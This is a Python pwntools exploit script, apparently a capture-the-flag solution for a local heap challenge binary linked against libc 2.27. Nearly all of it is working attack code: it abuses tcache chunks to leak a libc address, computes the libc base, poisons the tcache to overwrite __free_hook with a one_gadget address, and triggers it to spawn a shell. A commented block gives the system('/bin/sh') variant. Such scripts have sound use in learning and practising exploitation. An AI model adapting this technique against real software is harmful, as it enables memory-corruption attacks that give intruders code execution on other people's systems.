from pwn import *
context.log_level = 'debug'


#p = process("./chall")
p = process("./chall", env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.27.so")


def add(momo,content):
	p.sendlineafter("> ",'1')
	p.sendafter("> ",momo)
	p.sendafter("> ",content)

def delete(id):
	p.sendlineafter("> ",'2')
	p.sendlineafter("> ",str(id))

def show():
	p.sendlineafter("> ",'3')

for i in range(8):							
	add(chr(ord('a')+i)*0x10,'b'*0xf0)
for i in range(7,-1,-1):
	delete(chr(ord('a')+i)*0x10)
for i in range(7):							
	add(chr(ord('a')+i)*0x10,'b'*0xf0)

add('a'*0x8,"junk")

show()
p.recvuntil('a'*0x8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak_addr - (0x7ffff7dcdca0-0x7ffff79e2000)
log.info("libc_base:"+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
log.info("free_hook:"+hex(free_hook))

delete('b'*0x10)
delete(p64(0)+'b'*0x8)
add(p64(free_hook),'skye'.ljust(0xf0,'\x00'))
add(p64(0xdeadbeef),'s')
add(p64(libc_base+0x4f3c2),'s')

#gdb.attach(p,"b *$rebase(0xcd2)")
#raw_input()
delete(p64(libc_base+0x4f3c2)+p64(0))


'''
add(p64(free_hook-8),'skye'.ljust(0xf0,'\x00'))
add(p64(0xdeadbeef),'s')
add("/bin/sh\x00" + p64(libc.symbols["system"]),'s')
delete("/bin/sh\x00" + p64(libc.symbols["system"]))
'''


p.interactive() 